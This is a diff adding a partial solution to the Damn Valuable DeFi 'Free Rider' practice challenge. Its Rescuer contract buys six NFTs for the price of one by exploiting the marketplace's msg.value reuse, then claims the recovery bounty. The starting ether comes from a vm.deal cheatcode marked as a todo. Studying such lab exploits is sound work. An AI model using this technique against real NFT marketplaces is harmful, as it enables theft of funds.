@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +124,19 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Rescuer rescuer = new Rescuer(
+            token,
+            uniswapV2Factory,
+            uniswapV2Router,
+            uniswapPair,
+            marketplace,
+            nft,
+            recoveryManager,
+            player
+        );
+
+        vm.deal(address(rescuer), 15.1 ether); // todo how to get the initial ether?
+        rescuer.rescue();
     }
 
     /**
@@ -145,4 +158,51 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+
+contract Rescuer is Test{
+    DamnValuableToken token;
+    IUniswapV2Factory uniswapV2Factory;
+    IUniswapV2Router02 uniswapV2Router;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    address player = msg.sender;
+
+    constructor(DamnValuableToken _token, IUniswapV2Factory _uniswapV2Factory, IUniswapV2Router02 _uniswapV2Router,
+                IUniswapV2Pair _uniswapPair, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _nft,
+                FreeRiderRecoveryManager _recoveryManager, address _player) {
+        token = _token;
+        uniswapV2Factory = _uniswapV2Factory;
+        uniswapV2Router = _uniswapV2Router;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = _player;
+    }
+
+    function rescue() external {
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+        for (uint256 i = 0; i < 5; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i);
+        }
+
+        nft.safeTransferFrom(address(this), address(recoveryManager), 5, abi.encode(player));
+    }
+
+    function onERC721Received(address, address, uint256 tokenId, bytes memory _data)
+        external
+        returns (bytes4) {
+        // nft.transferFrom(address(this), address(recoveryManager), tokenId);
+        return bytes4(0x150b7a02);
+    }
+
+    receive() external payable {}
 }
